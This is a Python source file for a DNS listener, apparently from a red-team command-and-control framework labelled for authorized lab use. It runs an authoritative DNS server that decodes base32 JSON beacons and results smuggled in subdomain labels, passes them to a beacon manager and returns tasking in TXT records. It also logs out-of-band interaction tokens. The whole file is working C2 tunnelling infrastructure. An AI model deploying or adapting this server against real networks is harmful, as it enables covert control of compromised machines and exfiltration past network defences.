"""UDP DNS C2 + OAST — authoritative zone answers for authorized lab use."""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import re
import struct
import time
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from squidc5.listeners.manager import ListenerManager

log = logging.getLogger("squidc5.listeners.dns")

_TOKEN_RE = re.compile(r"^[a-z0-9]{8,32}$")

# DNS types
T_A = 1
T_NS = 2
T_SOA = 6
T_TXT = 16


def _b32pad(s: str) -> str:
    s = s.replace("-", "").replace("_", "").upper()
    pad = (-len(s)) % 8
    return s + ("=" * pad)


def decode_label_payload(labels: list[str], zone_labels: list[str]) -> dict[str, Any] | None:
    """Extract beacon JSON from labels before zone: b.<b32chunks...>.zone."""
    if len(labels) <= len(zone_labels):
        return None
    body = labels[: len(labels) - len(zone_labels)]
    if not body:
        return None
    mode = body[0].lower() if body else ""
    chunks = body[1:] if mode in ("b", "r", "c") else body
    raw = "".join(chunks)
    if not raw:
        return {"_mode": mode or "b"}
    try:
        data = base64.b32decode(_b32pad(raw))
        obj = json.loads(data.decode("utf-8"))
        if isinstance(obj, dict):
            obj["_mode"] = mode if mode in ("b", "r", "c") else "b"
            return obj
    except Exception:
        return {"_mode": mode or "b", "hostname": raw[:64]}
    return None


def encode_txt_response(obj: dict[str, Any]) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    return base64.b32encode(raw).decode("ascii").rstrip("=").lower()


def parse_dns_query(data: bytes) -> tuple[int, list[str], int] | None:
    """Return (txid, labels, qtype) or None."""
    if len(data) < 12:
        return None
    txid = struct.unpack("!H", data[0:2])[0]
    qdcount = struct.unpack("!H", data[4:6])[0]
    if qdcount < 1:
        return None
    pos = 12
    labels: list[str] = []
    try:
        while pos < len(data):
            ln = data[pos]
            pos += 1
            if ln == 0:
                break
            if ln & 0xC0:
                return None
            labels.append(data[pos : pos + ln].decode("ascii", errors="ignore"))
            pos += ln
        if pos + 4 > len(data):
            return None
        qtype, _qclass = struct.unpack("!HH", data[pos : pos + 4])
        return txid, labels, qtype
    except Exception:
        return None


def _question_slice(query: bytes) -> bytes:
    if len(query) < 12:
        return b""
    pos = 12
    while pos < len(query):
        ln = query[pos]
        pos += 1
        if ln == 0:
            break
        if ln & 0xC0:
            pos += 1
            break
        pos += ln
    pos += 4
    return query[12:pos]


def _encode_name(labels: list[str]) -> bytes:
    out = bytearray()
    for lab in labels:
        b = lab.encode("ascii", errors="ignore")[:63]
        out.append(len(b))
        out.extend(b)
    out.append(0)
    return bytes(out)


def _ipv4_bytes(ip: str) -> bytes:
    parts = ip.split(".")
    if len(parts) != 4:
        return bytes([127, 0, 0, 1])
    try:
        return bytes(int(p) & 0xFF for p in parts)
    except ValueError:
        return bytes([127, 0, 0, 1])


def build_dns_response(
    txid: int,
    query: bytes,
    txt: str | None,
    *,
    nxdomain: bool = False,
) -> bytes:
    """Legacy helper: TXT answer or NXDOMAIN."""
    question = _question_slice(query)
    flags = 0x8403 if nxdomain else 0x8400  # AA + response
    if nxdomain or not txt:
        return struct.pack("!HHHHHH", txid, flags if nxdomain else 0x8400, 1, 0, 0, 0) + question
    name_ptr = b"\xc0\x0c"
    txt_bytes = txt.encode("ascii", errors="ignore")[:200]
    rdata = bytes([len(txt_bytes)]) + txt_bytes
    answer = name_ptr + struct.pack("!HHIH", T_TXT, 1, 60, len(rdata)) + rdata
    header = struct.pack("!HHHHHH", txid, 0x8400, 1, 1, 0, 0)
    return header + question + answer


def build_dns_answers(
    txid: int,
    query: bytes,
    answers: list[tuple[int, bytes]],
    *,
    nxdomain: bool = False,
    aa: bool = True,
) -> bytes:
    """answers: list of (rtype, rdata)."""
    question = _question_slice(query)
    flags = 0x8000 | (0x0400 if aa else 0) | (0x0003 if nxdomain else 0)
    ancount = 0 if nxdomain else len(answers)
    header = struct.pack("!HHHHHH", txid, flags, 1, ancount, 0, 0)
    if nxdomain or not answers:
        return header + question
    body = bytearray()
    name_ptr = b"\xc0\x0c"
    for rtype, rdata in answers:
        body.extend(name_ptr)
        body.extend(struct.pack("!HHIH", rtype, 1, 60, len(rdata)))
        body.extend(rdata)
    return header + question + bytes(body)


class DnsProtocol(asyncio.DatagramProtocol):
    def __init__(
        self,
        manager: ListenerManager,
        listener_id: str,
        zone: str,
        *,
        mode: str = "both",
        public_ip: str = "127.0.0.1",
        ns_name: str = "",
    ) -> None:
        self.manager = manager
        self.listener_id = listener_id
        self.zone = zone.lower().strip(".")
        self.zone_labels = [p for p in self.zone.split(".") if p]
        self.mode = (mode or "both").lower()  # beacon | oast | both
        self.public_ip = public_ip or "127.0.0.1"
        # ns1.<zone> by default for glue-friendly answers
        self.ns_name = (ns_name or f"ns1.{self.zone}").lower().strip(".")
        self.transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[assignment]

    def datagram_received(self, data: bytes, addr: tuple[str | Any, int]) -> None:
        asyncio.create_task(self._handle(data, addr))

    def _send(self, data: bytes, addr: tuple[str | Any, int]) -> None:
        try:
            if self.transport is not None:
                self.transport.sendto(data, addr)
        except Exception:
            pass

    def _is_c2_body(self, body: list[str]) -> bool:
        if not body:
            return False
        return body[0] in ("b", "r", "c")

    def _oast_answers(self, qtype: int) -> list[tuple[int, bytes]]:
        answers: list[tuple[int, bytes]] = []
        if qtype in (T_A, 255):  # A or ANY
            answers.append((T_A, _ipv4_bytes(self.public_ip)))
        if qtype in (T_NS, 255):
            answers.append((T_NS, _encode_name(self.ns_name.split("."))))
        if qtype in (T_SOA, 255):
            # mname rname serial refresh retry expire minimum
            mname = _encode_name(self.ns_name.split("."))
            rname = _encode_name(["hostmaster"] + self.zone_labels)
            soa = mname + rname + struct.pack("!IIIII", 1, 3600, 600, 86400, 60)
            answers.append((T_SOA, soa))
        if qtype == T_TXT:
            answers.append((T_TXT, bytes([2]) + b"ok"))
        if not answers and qtype == T_A:
            answers.append((T_A, _ipv4_bytes(self.public_ip)))
        if not answers:
            # default A so scanners get something
            answers.append((T_A, _ipv4_bytes(self.public_ip)))
        return answers

    async def _handle(self, data: bytes, addr: tuple[str | Any, int]) -> None:
        if not self.transport:
            return
        parsed = parse_dns_query(data)
        if not parsed:
            return
        txid, labels, qtype = parsed
        labels_l = [x.lower() for x in labels]
        if len(labels_l) < len(self.zone_labels) or labels_l[-len(self.zone_labels) :] != self.zone_labels:
            self._send(build_dns_answers(txid, data, [], nxdomain=True), addr)
            return

        body = labels_l[: len(labels_l) - len(self.zone_labels)]
        is_c2 = self._is_c2_body(body)
        remote = str(addr[0]) if addr else None
        qname = ".".join(labels_l)
        oast = getattr(self.manager, "oast", None)

        # rate limit OAST flood
        if oast is not None and not oast.allow_remote(remote):
            self._send(build_dns_answers(txid, data, [], nxdomain=True), addr)
            return

        # Beacon C2 path
        if is_c2 and self.mode in ("beacon", "both"):
            payload = decode_label_payload(labels_l, self.zone_labels) or {}
            mode = payload.pop("_mode", "b")
            try:
                if mode == "r":
                    result = await self.manager.handle_beacon_result(payload)
                else:
                    result = await self.manager.handle_beacon(
                        listener_id=self.listener_id,
                        remote_addr=remote,
                        payload=payload,
                        user_agent="dns-c2",
                    )
                if oast is not None:
                    ctok = None
                    meta = payload.get("metadata") if isinstance(payload.get("metadata"), dict) else {}
                    ctok = meta.get("oast_token") or payload.get("oast_token")
                    if ctok:
                        await oast.record(
                            protocol="dns",
                            listener_id=self.listener_id,
                            remote=remote,
                            token=str(ctok).lower(),
                            raw={"qname": qname, "qtype": qtype, "c2": True, "mode": mode},
                            correlation_key=str(ctok).lower(),
                        )
                txt = encode_txt_response(result)
                if qtype == T_TXT:
                    self._send(build_dns_response(txid, data, txt), addr)
                else:
                    self._send(build_dns_answers(txid, data, [(T_A, _ipv4_bytes(self.public_ip))]), addr)
                await self.manager.metrics.incr("dns.queries")
            except Exception:
                log.exception("DNS C2 handler error from %s", addr)
                self._send(build_dns_answers(txid, data, [], nxdomain=True), addr)
            return

        if is_c2 and self.mode == "oast":
            # C2 labels ignored in oast-only mode — still log as OAST
            pass

        # OAST: any query under zone
        if self.mode in ("oast", "both") or not is_c2:
            token = None
            if body and _TOKEN_RE.match(body[0]):
                token = body[0]
            elif body and not is_c2 and len(body[0]) >= 8:
                token = body[0]
            if oast is not None:
                try:
                    await oast.record(
                        protocol="dns",
                        listener_id=self.listener_id,
                        remote=remote,
                        token=token,
                        raw={
                            "qname": qname,
                            "qtype": qtype,
                            "labels": labels_l,
                            "zone": self.zone,
                            "ts": time.time(),
                        },
                        correlation_key=token,
                    )
                except Exception:
                    log.exception("DNS OAST record failed")
            answers = self._oast_answers(qtype)
            self._send(build_dns_answers(txid, data, answers), addr)
            try:
                await self.manager.metrics.incr("dns.oast")
                await self.manager.metrics.incr("dns.queries")
            except Exception:
                pass
            return

        self._send(build_dns_answers(txid, data, [], nxdomain=True), addr)


async def start_dns_server(
    manager: ListenerManager,
    listener_id: str,
    host: str,
    port: int,
    zone: str,
    *,
    mode: str = "both",
    public_ip: str = "127.0.0.1",
    ns_name: str = "",
) -> tuple[asyncio.DatagramTransport, asyncio.BaseProtocol]:
    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: DnsProtocol(
            manager,
            listener_id,
            zone,
            mode=mode,
            public_ip=public_ip,
            ns_name=ns_name,
        ),
        local_addr=(host, port),
    )
    return transport, protocol
